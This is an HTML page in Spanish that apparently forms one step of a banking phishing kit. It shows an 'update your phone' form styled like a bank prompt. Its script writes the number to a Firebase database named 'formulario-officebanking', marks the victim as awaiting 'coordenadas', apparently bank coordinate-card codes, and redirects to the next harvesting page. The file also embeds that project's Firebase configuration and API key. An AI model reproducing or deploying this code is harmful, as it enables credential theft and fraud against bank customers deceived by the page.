<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Actualizar Teléfono</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: white;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .contenedor {
      border: 3px solid red;
      padding: 20px;
      width: 90vw;
      max-width: 400px;
      background: white;
      box-sizing: border-box;
    }
    label {
      display: block;
      font-weight: bold;
      margin-bottom: 10px;
      text-align: center;
    }
    input[type="number"] {
      width: 100%;
      padding: 10px;
      font-size: 1em;
      border: 1px solid black;
      border-radius: 4px;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 10px;
      background-color: red;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="contenedor">
    <label for="telefono">Necesitamos actualizar tu teléfono</label>
    <input type="number" id="telefono" maxlength="9" required placeholder="Ej: 912345678" />
    <button onclick="enviarTelefono()">Siguiente</button>
  </div>

  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function enviarTelefono() {
      const telefono = document.getElementById("telefono").value;
      if (telefono.length !== 9) {
        alert("Debe tener exactamente 9 números");
        return;
      }
      db.ref("ultimo_usuario").once("value").then(snap => {
        const userId = snap.val();
        db.ref("usuarios/" + userId + "/telefono").set(telefono);
        db.ref("estado_usuario/" + userId).set({ estado: "esperando_coordenadas" });
        window.location.href = "coordenadas.html";
      });
    }
  </script>
</body>
</html>
